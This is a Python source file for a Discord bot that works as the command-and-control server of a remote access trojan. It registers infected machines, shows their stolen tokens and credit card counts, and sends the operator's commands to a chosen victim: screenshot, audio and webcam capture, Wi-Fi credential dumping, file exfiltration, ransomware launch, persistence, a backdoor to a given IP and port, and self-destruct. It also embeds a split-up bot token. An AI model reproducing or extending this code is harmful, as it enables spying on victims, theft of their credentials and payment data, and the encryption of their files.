import discord
from discord.ext import commands
import json
import datetime
import logging
import os
import sys
import traceback

# 🔹 Logging setup
log_formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
log_file = open("bot_out.log", "a")
log_file_handler = logging.StreamHandler(log_file)
console_handler = logging.StreamHandler(sys.stdout)

for handler in [log_file_handler, console_handler]:
    handler.setFormatter(log_formatter)

logging.basicConfig(
    level=logging.DEBUG,
    handlers=[log_file_handler, console_handler]
)

logging.info("🧪 Logging initialized")

# 🔹 Bot setup
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

DATA_FILE = "hosts_data.json"
DB = {"hosts": {}, "current": None}

def load_db():
    global DB
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            DB = json.load(f)

def save_db():
    with open(DATA_FILE, "w") as f:
        json.dump(DB, f, indent=2)

load_db()

@bot.event
async def on_ready():
    logging.info(f"✅ Logged in as {bot.user.name}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    await bot.process_commands(message)

    if ":" not in message.content:
        return

    try:
        unique_id, cmd = message.content.split(":", 1)
    except ValueError:
        return

    # Register host
    if cmd.startswith("register "):
        hostname = cmd.split(" ", 1)[1]
        DB["hosts"][unique_id] = {
            "alias": hostname,
            "last_seen": datetime.datetime.utcnow().isoformat(),
            "info": {}
        }
        if not DB["current"]:
            DB["current"] = unique_id
        save_db()
        return await message.channel.send(f"✅ Registered `{hostname}` with ID `{unique_id}`.")

    # Update host info
    if cmd.startswith("update "):
        try:
            info = json.loads(cmd[7:])
            if unique_id in DB["hosts"]:
                DB["hosts"][unique_id]["info"] = info
                DB["hosts"][unique_id]["last_seen"] = datetime.datetime.utcnow().isoformat()
                save_db()
                return await message.channel.send(f"🔄 Info updated for `{info.get('alias', unique_id)}`.")
        except json.JSONDecodeError:
            return await message.channel.send("❌ Invalid JSON format in update.")

    # Validate and update last seen
    if unique_id not in DB["hosts"]:
        return

    DB["hosts"][unique_id]["last_seen"] = datetime.datetime.utcnow().isoformat()
    save_db()

    if unique_id != DB["current"]:
        return

# 🔹 Basic test
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong!")

# 🔹 Host list
@bot.command()
async def hosts(ctx):
    if not DB["hosts"]:
        return await ctx.send("No hosts registered.")
    lines = ["**Known Hosts:**"]
    for uid, info in DB["hosts"].items():
        mark = "✅" if uid == DB["current"] else "•"
        lines.append(f"{mark} `{info['alias']}` — `{uid}`")
    await ctx.send("\n".join(lines))

# 🔹 Connect to host
@bot.command(name="connect", aliases=["set_current"])
async def connect(ctx, alias: str):
    for uid, info in DB["hosts"].items():
        if info["alias"].lower() == alias.lower():
            DB["current"] = uid
            save_db()
            return await ctx.send(f"🎯 Now targeting `{info['alias']}`.")
    await ctx.send("❌ No such host found.")

# 🔹 Screenshot trigger
@bot.command()
async def screenshot(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:take_screenshot")

# 🔹 Record audio trigger
@bot.command()
async def record_audio(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:record_audio")

# 🔹 Get IP and geolocation
@bot.command()
async def get_ip(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:get_ip")

# 🔹 List accounts
@bot.command()
async def list_accounts(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:list_accounts")

# 🔹 Dump Wi-Fi credentials
@bot.command()
async def dump_wifi(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:dump_wifi")

# 🔹 Start webcam
@bot.command()
async def start_webcam(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:start_webcam")

# 🔹 Exfiltrate files
@bot.command()
async def exfiltrate(ctx, path: str):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:exfiltrate {path}")

# 🔹 Start ransomware
@bot.command()
async def start_ransomware(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:start_ransomware")

# 🔹 Install persistence
@bot.command()
async def install_persistence(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:install_persistence")

# 🔹 Self destruct
@bot.command()
async def self_destruct(ctx):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:self_destruct")

# 🔹 Open backdoor
@bot.command()
async def open_backdoor(ctx, ip: str, port: int):
    if DB["current"]:
        await ctx.send(f"{DB['current']}:open_backdoor {ip}:{port}")

# 🔹 Status command
@bot.command()
async def status(ctx):
    if not DB["hosts"]:
        return await ctx.send("🛑 No hosts registered.")
    current_id = DB.get("current")
    if not current_id or current_id not in DB["hosts"]:
        return await ctx.send("🎯 No host is currently targeted.")

    host = DB["hosts"][current_id]
    info = host.get("info", {})
    last_seen = host.get("last_seen", "unknown")
    alias = host.get("alias", "unknown")

    lines = [
        f"📊 **Host Info: {alias}**",
        f"👤 **User:** {info.get('username', 'unknown')}",
        f"💻 **OS:** {info.get('platform', 'unknown')}",
        f"🌍 **Location:** {info.get('location', 'unknown')}",
        f"🔑 **Tokens:** {info.get('tokens', 0)}",
        f"💳 **Credit Cards:** {info.get('ccs', 0)}",
        f"🏷️ **Tag:** {info.get('job', 'none')}",
        f"🕒 **Last Seen:** {last_seen}",
        f"🆔 **UUID:** `{current_id}`"
    ]

    await ctx.send("\n".join(lines))

# 🔐 Hardcoded token
# 🔐 Obfuscated Discord Bot Token
part1 = "MTM2ODQ0MzMzOTI3N"
part2 = "TM3NDY1Mg.G3bVCs.oF0E"
part3 = "p8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"
TOKEN = part1 + part2 + part3

try:
    bot.run(TOKEN)
except Exception as e:
    logging.error("❌ Bot crashed on startup.")
    with open("bot_err.log", "a") as f:
        f.write("=== BOT CRASH ===\n")
        traceback.print_exc(file=f)
